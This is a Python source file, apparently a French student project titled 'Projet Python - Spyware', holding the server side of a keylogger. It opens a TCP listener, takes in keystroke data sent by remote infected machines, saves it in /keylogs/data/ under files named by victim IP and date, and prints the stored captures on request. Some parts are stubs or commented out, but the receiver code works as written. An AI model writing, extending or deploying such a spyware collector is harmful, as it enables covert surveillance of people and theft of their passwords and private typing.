import argparse
import os
import socket
import sys
import threading
import time
import glob


from env import *
import datetime

TXT_GLOB = ""


def argument():
    p = argparse.ArgumentParser(description='Projet Python - Spyware')
    p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
                                                               "l'utilisateur et attend les données du spyware UP")
    p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le "
                                                             "programme")
    p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur "
                                                                 "du spyware. Le contenu doit être parfaitement "
                                                                 "lisible")
    p.add_argument('-k', '--kill', action='store_true',
                   help="arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de "
                        "supprimer la capture.")
    args = p.parse_args()
    return args


def kill_all():
    print("tout tuer ")


def chrono():
    global TXT_GLOB
    while True:
        seconds = 0
        while True:
            print(f"Secondes : {seconds}")
            seconds += 1
            time.sleep(1)
            if seconds % 10 == 0:
                print("Ajout de data")  # si pas de reponse du client, on kill tout
            if seconds == 600:
                kill_all()


def commands(cmd):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect((SRV, PORT))

    client_socket.send(cmd.encode('utf-8'))  # envoi

    client_socket.close()


def receiver(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.bind(("0.0.0.0", port))

    server_socket.listen(1)

    print(f"Ecoute sur {SRV}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"connexion de {client_address}")

        ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
        # recu data
        with open("/keylogs/data/" + ficname, "a") as f:
            data = client_socket.recv(1024)
            f.write(data.decode('utf-8'))
            print("connexion :" + ficname)
    client_socket.close()
    server_socket.close()


if __name__ == '__main__':

    arg = argument()

    if arg.readfile:
        path = '/keylogs/data/'
        fics = glob.glob(os.path.join(path, '*'))
        for fic in fics:
            print("------------------")
            print(fic)
            print("DATA : \n ")
            with open(fic, "r") as f:
                d = f.read()
                print(d)
                print("------------------")
        sys.exit()

    if arg.show and not arg.readfile:
        path = '/keylogs/data/'
        fics = glob.glob(os.path.join(path, '*'))
        for fic in fics:
            print("------------------")
            print(fic)
            print("------------------")
        sys.exit()

    else:

        if arg.listen:
            print(f'Argument -l: {arg.listen}')
            port = arg.listen
        else:
            port = PORT

        receiver_t = threading.Thread(target=receiver, args=(port,))

        receiver_t.start()

    # commands_t = threading.Thread(target=commands)

    # commands_t.start()
